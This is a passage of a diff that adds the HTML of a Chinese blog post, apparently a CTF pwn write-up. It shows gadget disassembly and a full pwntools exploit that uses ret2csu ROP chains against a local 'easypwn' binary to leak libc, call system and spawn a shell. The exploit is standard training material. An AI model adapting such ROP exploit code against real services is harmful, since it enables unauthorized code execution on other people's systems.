class="line">.text:<span class="number">00000000004007E0</span>                 pop     r14</span><br><span class="line">.text:<span class="number">00000000004007E2</span>                 pop     r15</span><br><span class="line">.text:<span class="number">00000000004007E4</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004007E4</span> ; &#125; <span class="comment">// starts at 400780</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就是套路模板EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./easypwn'</span>)</span><br><span class="line">elf=ELF(<span class="string">"./easypwn"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4006FD</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4007E3</span><span class="comment"># pop rdi ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x4007DC</span><span class="comment"># pop r12 r13 r14 r15</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x4007DA</span><span class="comment"># pop rbx rbp r12 r13 r14 r15</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x4007C0</span></span><br><span class="line"><span class="comment">#mov rdx, r13 mov rsi, r14 mov di, r15d  call qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to CTF\n"</span>)</span><br><span class="line"></span><br><span class="line">    got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">    payload=<span class="number">0x18</span>*<span class="string">"a"</span> + p64(pop4_r12_ret)</span><br><span class="line"></span><br><span class="line">    payload+=p64(pop6_rbx_ret)+ p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(got_write)</span><br><span class="line">    payload+=p64(<span class="number">8</span>) + p64(got_write) + p64(<span class="number">1</span>)  + p64(mov_rdx_rsi_edi_call)</span><br><span class="line">    payload+=<span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    io.recvuntil(<span class="number">0x18</span>*<span class="string">"a"</span>)</span><br><span class="line">    io.recv(<span class="number">3</span>)</span><br><span class="line">    write_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_addr:"</span>+hex(write_addr)</span><br><span class="line">    libc_base_addr=write_addr-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base_addr:"</span>+hex(libc_base_addr)</span><br><span class="line">    system_addr=libc_base_addr+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">    </span><br><span class="line">    bbs_addr = elf.bss()</span><br><span class="line">    </span><br><span class="line">    payload =  <span class="number">0x18</span>*<span class="string">"a"</span></span><br><span class="line">    payload += p64(pop4_r12_ret)</span><br><span class="line">    payload += p64(pop6_rbx_ret) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">8</span>) + p64(bbs_addr) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call)</span><br><span class="line">    payload += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(bbs_addr)</span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to CTF\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/09/14/╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ/" rel="next" title="高级ROP-ret2dl_runtime之通杀详解">
+                  <i class="fa fa-chevron-left"></i> 高级ROP-ret2dl_runtime之通杀详解
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/09/18/┤╙BabyCanary╚δ├┼Canary/" rel="prev" title="从BabyCanary入门Canary">
+                  从BabyCanary入门Canary <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
